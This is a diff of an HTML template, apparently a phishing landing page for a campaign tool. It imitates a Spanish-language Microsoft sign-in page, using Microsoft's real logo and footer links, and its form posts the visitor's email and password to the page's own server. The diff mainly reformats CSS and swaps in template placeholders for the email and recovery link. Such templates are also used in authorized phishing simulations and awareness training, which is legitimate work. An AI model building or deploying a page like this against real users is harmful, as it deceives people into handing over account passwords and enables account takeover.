@@ -1,13 +1,24 @@
 <!DOCTYPE html>
 <html lang="es-US">
-<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-	<title>Iniciar Sesi&oacute;n</title>
-	<style type="text/css">* { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body {
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Iniciar Sesi&oacute;n</title>
+    <style type="text/css">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
             height: 100%;
             font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
             color: #1b1b1b;
         }
+
         body {
             background-color: #f2f2f2;
             background-image: linear-gradient(to bottom right, #eef3fb, #e6ebf5);
@@ -17,18 +28,21 @@
             padding: 48px 16px;
             min-height: 100%;
         }
+
         .card {
             background: #ffffff;
             width: 100%;
             max-width: 440px;
             padding: 44px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.18);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.18);
         }
+
         .ms-logo {
             display: flex;
             align-items: center;
             margin-bottom: 16px;
         }
+
         .ms-logo .squares {
             width: 21px;
             height: 21px;
@@ -38,26 +52,54 @@
             gap: 1px;
             margin-right: 8px;
         }
-        .ms-logo .squares span { display: block; }
-        .ms-logo .squares .s1 { background: #f25022; }
-        .ms-logo .squares .s2 { background: #7fba00; }
-        .ms-logo .squares .s3 { background: #00a4ef; }
-        .ms-logo .squares .s4 { background: #ffb900; }
-        .ms-logo .word { font-size: 15px; color: #5e5e5e; font-weight: 600; }
+
+        .ms-logo .squares span {
+            display: block;
+        }
+
+        .ms-logo .squares .s1 {
+            background: #f25022;
+        }
+
+        .ms-logo .squares .s2 {
+            background: #7fba00;
+        }
+
+        .ms-logo .squares .s3 {
+            background: #00a4ef;
+        }
+
+        .ms-logo .squares .s4 {
+            background: #ffb900;
+        }
+
+        .ms-logo .word {
+            font-size: 15px;
+            color: #5e5e5e;
+            font-weight: 600;
+        }
+
         h1 {
             font-size: 24px;
             font-weight: 600;
             margin: 8px 0 4px;
             color: #1b1b1b;
         }
-        .field { margin: 18px 0 0; }
+
+        .field {
+            margin: 18px 0 0;
+        }
+
         label {
             display: block;
             font-size: 13px;
             margin-bottom: 4px;
             color: #1b1b1b;
         }
-        input[type="email"], input[type="text"], input[type="password"] {
+
+        input[type="email"],
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
             border: none;
             border-bottom: 1px solid #666;
@@ -66,14 +108,30 @@
             background: transparent;
             outline: none;
         }
-        input:focus { border-bottom: 2px solid #0067b8; }
-        .links { margin-top: 14px; font-size: 13px; }
-        .links a { color: #0067b8; text-decoration: none; }
-        .links a:hover { text-decoration: underline; }
+
+        input:focus {
+            border-bottom: 2px solid #0067b8;
+        }
+
+        .links {
+            margin-top: 14px;
+            font-size: 13px;
+        }
+
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
         .actions {
             margin-top: 28px;
             text-align: right;
         }
+
         button {
             background: #0067b8;
             color: #ffffff;
@@ -83,8 +141,17 @@
             font-size: 15px;
             cursor: pointer;
         }
-        button:hover { background: #005da6; }
-        .subtext { font-size: 13px; color: #1b1b1b; margin-top: 12px; }
+
+        button:hover {
+            background: #005da6;
+        }
+
+        .subtext {
+            font-size: 13px;
+            color: #1b1b1b;
+            margin-top: 12px;
+        }
+
         .footer {
             max-width: 440px;
             width: 100%;
@@ -93,32 +160,51 @@
             font-size: 12px;
             color: #666;
         }
-        .footer a { color: #666; text-decoration: none; margin-left: 12px; }
-        .footer a:hover { text-decoration: underline; }
-        @media (max-width: 480px) {
-            .card { padding: 32px 24px; }
+
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin-left: 12px;
         }
-	</style>
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 32px 24px;
+            }
+        }
+    </style>
 </head>
+
 <body>
-<div>
-<div class="card"><img alt="Microsoft" class="___1v417w0 f2rbwfs frvgh55" data-testid="accessibleImg" role="" src="https://logincdn.msauth.net/shared/5/js/../images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" />
-<h1>Iniciar Sesi&oacute;n</h1>
+    <div>
+        <div class="card"><img alt="Microsoft" class="___1v417w0 f2rbwfs frvgh55" data-testid="accessibleImg" role=""
+                src="https://logincdn.msauth.net/shared/5/js/../images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" />
+            <h1>Login</h1>
 
-<form action="" method="POST">
-<div class="field"><label for="email">Correo electr&oacute;nico, tel&eacute;fono, o&nbsp;Skype</label> <input autocomplete="username" id="email" name="username" required="" type="email" value="{{.Email}}" /></div>
+            <form action="" method="POST">
+                <div class="field"><label for="email">Correo electr&oacute;nico, tel&eacute;fono, o&nbsp;Skype</label>
+                    <input autocomplete="username" id="email" name="username" required="" type="email"
+                        value="{{.Email}}" /></div>
 
-<div class="field"><label for="password">Contrase&ntilde;a</label> <input autocomplete="current-password" id="password" name="password" placeholder="Contraseña" required="" type="password" /></div>
+                <div class="field"><label for="password">Contrase&ntilde;a</label> <input
+                        autocomplete="current-password" id="password" name="password" placeholder="Contraseña"
+                        required="" type="password" /></div>
 
-<div class="links"><a href="/forgot">&iquest;No puede acceder a su cuenta?</a></div>
+                <div class="links"><a href={{.URL}}>&iquest;No puede acceder a su cuenta?</a></div>
 
-<div class="actions"><button type="submit">Ingresar</button></div>
-</form>
+                <div class="actions"><button type="submit">Ingresar</button></div>
+            </form>
 
-<p class="subtext">&iquest;No tiene una cuenta? Contacta con un administrador en TI.</p>
-</div>
+            <p class="subtext">&iquest;No tiene una cuenta? Contacta con un administrador en TI.</p>
+        </div>
 
-<div class="footer"><a href="https://privacy.microsoft.com/es-US/privacystatement">Privacidad y cookies</a> <a href="https://www.microsoft.com/es-US/servicesagreement/">T&eacute;rminos de uso</a></div>
-</div>
+        <div class="footer"><a href="https://privacy.microsoft.com/es-US/privacystatement">Privacidad y cookies</a> <a
+                href="https://www.microsoft.com/es-US/servicesagreement/">T&eacute;rminos de uso</a></div>
+    </div>
 </body>
+
 </html>
